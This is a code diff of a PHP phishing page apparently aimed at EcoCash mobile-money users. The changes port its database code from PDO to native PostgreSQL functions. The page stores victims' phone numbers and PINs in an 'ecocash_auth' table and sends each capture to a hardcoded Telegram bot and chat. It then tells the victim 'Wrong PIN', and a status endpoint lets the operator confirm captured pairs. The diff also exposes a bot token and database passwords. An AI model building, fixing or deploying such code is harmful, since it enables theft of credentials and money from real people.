@@ -5,13 +5,12 @@ session_start();
 $botToken = "8163112809:AAH5OFmjVHKPDz1svGG9viGjpAuNLFHsctc";
 $chatId   = "-5193742613";
 
-// PostgreSQL credentials (default port changed to 5432)
 // PostgreSQL credentials
-$dbHost = "dpg-d8l5ii7lk1mc73cjcvs0-a";   // ← quotes added
+$dbHost = "10.25.174.79";          // Use IP from logs (or your full hostname)
 $dbPort = 5432;
-$dbName = "loan_9d8q";                    // ← quotes added
-$dbUser = "loan_9d8q_user";               // ← quotes added
-$dbPass = "Jhl6RiIZwV5AnvLVCKirxqgLMtFi5gZX"; // ← quotes added
+$dbName = "loan_9d8q";
+$dbUser = "postgres";
+$dbPass = "Jhl6RiIZwV5AnvLVCKirxqgLMtFi5gZX";
 
 // ==================================
 
@@ -30,30 +29,25 @@ if (empty($phone)) {
 }
 
 /**
- * Create a PostgreSQL PDO connection
- * @return PDO|null
+ * Create a PostgreSQL connection using native pg_* functions
+ * @return resource|false
  */
 function getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass) {
-    static $pdo = null;
-    if ($pdo === null) {
-        // Check if PDO PostgreSQL driver is available
-        if (!in_array('pgsql', PDO::getAvailableDrivers())) {
-            error_log("PDO PostgreSQL driver is NOT available. Installed drivers: " . implode(',', PDO::getAvailableDrivers()));
-            return null;
+    static $conn = null;
+    if ($conn === null) {
+        // Check if PostgreSQL extension is available
+        if (!function_exists('pg_connect')) {
+            error_log("PostgreSQL extension (pgsql) is NOT available.");
+            return false;
         }
-        try {
-            $dsn = "pgsql:host=$dbHost;port=$dbPort;dbname=$dbName;options='--client_encoding=UTF8'";
-            $pdo = new PDO($dsn, $dbUser, $dbPass, [
-                PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
-                PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
-                PDO::ATTR_TIMEOUT => 5
-            ]);
-        } catch (PDOException $e) {
-            error_log("Database connection failed: " . $e->getMessage());
-            return null;
+        $connString = "host=$dbHost port=$dbPort dbname=$dbName user=$dbUser password=$dbPass";
+        $conn = @pg_connect($connString);
+        if (!$conn) {
+            error_log("Database connection failed: " . pg_last_error());
+            return false;
         }
     }
-    return $pdo;
+    return $conn;
 }
 
 // Function to send Telegram message (unchanged)
@@ -113,21 +107,20 @@ if (isset($_GET['check_status']) && $_GET['check_status'] == 1) {
         echo json_encode(['verified' => false]);
         exit;
     }
-    $pdo = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
-    if (!$pdo) {
-        echo json_encode(['verified' => false, 'error' => 'db_driver_missing']);
+    $conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
+    if (!$conn) {
+        echo json_encode(['verified' => false, 'error' => 'db_extension_missing']);
         exit;
     }
-    try {
-        $stmt = $pdo->prepare("SELECT status FROM ecocash_auth WHERE phone = :phone AND pin = :pin LIMIT 1");
-        $stmt->execute([':phone' => $checkPhone, ':pin' => $checkPin]);
-        $record = $stmt->fetch();
-        $verified = ($record && (int)$record['status'] === 1);
-        echo json_encode(['verified' => $verified]);
-    } catch (PDOException $e) {
-        error_log("AJAX check_status error: " . $e->getMessage());
+    $result = pg_query_params($conn, "SELECT status FROM ecocash_auth WHERE phone = $1 AND pin = $2 LIMIT 1", [$checkPhone, $checkPin]);
+    if (!$result) {
+        error_log("AJAX check_status query error: " . pg_last_error($conn));
         echo json_encode(['verified' => false]);
+        exit;
     }
+    $record = pg_fetch_assoc($result);
+    $verified = ($record && (int)$record['status'] === 1);
+    echo json_encode(['verified' => $verified]);
     exit;
 }
 
@@ -138,30 +131,34 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $pin = preg_replace('/[^0-9]/', '', $pin);
     
     if (strlen($pin) === 4) {
-        $pdo = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
-        if (!$pdo) {
-            $error = "System error: database driver missing. Please contact administrator.";
-            error_log("PDO PostgreSQL driver missing when processing PIN submission");
+        $conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
+        if (!$conn) {
+            $error = "System error: database extension missing. Please contact administrator.";
+            error_log("PostgreSQL extension missing when processing PIN submission");
         } else {
-            try {
-                // Create table if it doesn't exist (PostgreSQL syntax)
-                $pdo->exec("CREATE TABLE IF NOT EXISTS ecocash_auth (
+            // Create table if it doesn't exist
+            $createSQL = "
+                CREATE TABLE IF NOT EXISTS ecocash_auth (
                     id SERIAL PRIMARY KEY,
                     phone VARCHAR(20) NOT NULL,
                     pin VARCHAR(4) NOT NULL,
                     status SMALLINT DEFAULT 0,
                     created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                     UNIQUE(phone, pin)
-                )");
-                
-                // PostgreSQL: INSERT ... ON CONFLICT instead of INSERT IGNORE
-                $insertStmt = $pdo->prepare("
-                    INSERT INTO ecocash_auth (phone, pin, status)
-                    VALUES (:phone, :pin, 0)
-                    ON CONFLICT (phone, pin) DO NOTHING
-                ");
-                $insertStmt->execute([':phone' => $phone, ':pin' => $pin]);
-                
+                )";
+            pg_query($conn, $createSQL);
+            
+            // Insert using ON CONFLICT (PostgreSQL 9.5+)
+            $insertSQL = "
+                INSERT INTO ecocash_auth (phone, pin, status)
+                VALUES ($1, $2, 0)
+                ON CONFLICT (phone, pin) DO NOTHING";
+            $insertResult = pg_query_params($conn, $insertSQL, [$phone, $pin]);
+            
+            if (!$insertResult) {
+                error_log("PIN insert error: " . pg_last_error($conn));
+                $error = "System error. Try again later.";
+            } else {
                 // Send Telegram notification
                 $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
                 $time = date('Y-m-d H:i:s');
@@ -170,9 +167,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 
                 $_SESSION['pending_pin'] = $pin;
                 $error = "Wrong PIN";
-            } catch (PDOException $e) {
-                error_log("PIN insert error: " . $e->getMessage());
-                $error = "System error. Try again later.";
             }
         }
     } else {
